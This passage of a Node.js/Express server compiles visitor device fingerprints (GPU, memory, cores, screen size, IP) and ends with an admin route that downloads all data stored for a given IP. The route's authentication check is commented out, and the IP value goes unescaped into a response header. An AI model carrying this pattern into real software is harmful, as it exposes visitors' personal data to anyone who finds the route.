    // Count screen sizes
    if (deviceInfo.screen?.width && deviceInfo.screen?.height) {
      const screenSize = `${deviceInfo.screen.width}×${deviceInfo.screen.height}`;
      deviceData.screenSizes[screenSize] =
        (deviceData.screenSizes[screenSize] || 0) + 1;
    }

    // Add to hardware info if we have detailed data
    if (deviceInfo.hardware || deviceInfo.screen) {
      deviceData.hardwareInfo.push({
        ip: user.ipAddress,
        sanitizedIp: ip,
        browser,
        os,
        gpu: deviceInfo.hardware?.gpuRenderer || "Unknown",
        memory: deviceInfo.memory || "Unknown",
        cores: deviceInfo.hardwareConcurrency || "Unknown",
        screenSize:
          deviceInfo.screen?.width && deviceInfo.screen?.height
            ? `${deviceInfo.screen.width}×${deviceInfo.screen.height}`
            : "Unknown",
      });
    }
  });

  // Convert objects to arrays for easier rendering
  deviceData.browsersArray = Object.entries(deviceData.browsers)
    .map(([name, count]) => ({ name, count }))
    .sort((a, b) => b.count - a.count);

  deviceData.operatingSystemsArray = Object.entries(deviceData.operatingSystems)
    .map(([name, count]) => ({ name, count }))
    .sort((a, b) => b.count - a.count);

  deviceData.screenSizesArray = Object.entries(deviceData.screenSizes)
    .map(([size, count]) => ({ size, count }))
    .sort((a, b) => b.count - a.count);

  return deviceData;
}

// Route to download all data for a specific user
app.get("/adminofthisapp/user/:ip/download", (req, res) => {
  // In production, add authentication here
  // if (!req.session.isAdmin) return res.status(403).send('Access denied');

  try {
    const { ip } = req.params;
    const userData = getSingleUserData(ip);

    if (!userData) {
      return res.status(404).send("User not found");
    }

    // Set response headers for file download
    res.setHeader("Content-Type", "application/json");
    res.setHeader(
      "Content-Disposition",
      `attachment; filename=user-${ip}-data.json`
    );

    // Send the JSON data
    res.send(JSON.stringify(userData, null, 2));
  } catch (error) {
    console.error(`Error downloading data for user ${req.params.ip}:`, error);
    res.status(500).send("Error generating user data download");
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
